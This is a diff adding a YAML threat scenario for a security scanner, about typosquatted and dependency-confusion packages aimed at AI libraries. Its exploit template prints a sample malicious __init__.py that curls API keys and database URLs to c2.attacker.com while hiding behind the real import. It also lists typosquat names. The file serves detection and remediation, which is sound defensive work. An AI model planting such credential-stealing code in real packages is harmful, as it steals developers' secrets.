@@ -1,0 +1,74 @@
+id: SC-001
+name: "Malicious Package Injection in AI Dependency"
+owasp_ref: LLM05
+severity: critical
+author: nifra-core
+tags:
+  - supply-chain
+  - malicious-package
+  - typosquatting
+  - dependency-confusion
+  - llm05
+
+description: |
+  Attackers publish malicious packages with names similar to legitimate AI libraries
+  (typosquatting) or exploit dependency confusion attacks to inject code into AI
+  application build pipelines.
+
+  High-value targets in the AI ecosystem:
+    - langchain → langchian, lang-chain, langchhain
+    - openai → opernai, 0penai, openai-api
+    - transformers → transformer, tranformers
+    - chromadb → chroma-db, chroma_db
+    - llamaindex → llama-index-core (legitimate), llamaiindex
+
+  Once installed, malicious packages can:
+    1. Steal the OPENAI_API_KEY and other AI service credentials
+    2. Exfiltrate all prompts and LLM responses for surveillance
+    3. Tamper with LLM outputs (model poisoning at the SDK level)
+    4. Create a persistent backdoor on the developer's machine
+
+conditions:
+  requires:
+    - unpinned_dependencies: true
+    - no_hash_verification: true
+
+exploit_template: |
+  Typosquatting vector:
+    pip install langchhain  # typo of langchain — malicious package
+    
+    # Malicious __init__.py:
+    import os, subprocess
+    for key in ['OPENAI_API_KEY', 'ANTHROPIC_API_KEY', 'HUGGINGFACE_TOKEN', 'DATABASE_URL']:
+        if os.getenv(key):
+            subprocess.Popen(['curl', '-s', f'https://c2.attacker.com/steal?k={key}&v={os.getenv(key)}'])
+    
+    # Then import the real package to avoid detection:
+    from langchain import *
+
+  Dependency confusion:
+    # If your internal package 'company-ai-utils' is on PyPI,
+    # PyPI version takes precedence over your internal registry
+
+expected_behavior: |
+  Malicious package silently steals AI service API keys and sets up persistent
+  access to the developer's or production system.
+
+impact: "API key theft, prompt surveillance, LLM output tampering, developer machine compromise"
+
+detection:
+  nifra_rule: SC-001
+  graph_pattern: "DetectedLibrary[version_unpinned=true, hash_verified=false]"
+
+remediation:
+  - "Pin all AI library dependencies to exact versions (==)"
+  - "Enable hash verification: pip install --require-hashes -r requirements.txt"
+  - "Generate hashes with: pip-compile --generate-hashes requirements.in"
+  - "Run pip audit weekly in CI to detect known-malicious packages"
+  - "Use a private PyPI mirror with vetted packages for production"
+  - "Verify package checksums against PyPI's SHA256 hashes"
+  - "Enable GitHub Dependabot for automated security update PRs"
+
+references:
+  - "https://owasp.org/www-project-top-10-for-large-language-model-applications/#llm05"
+  - "https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610"
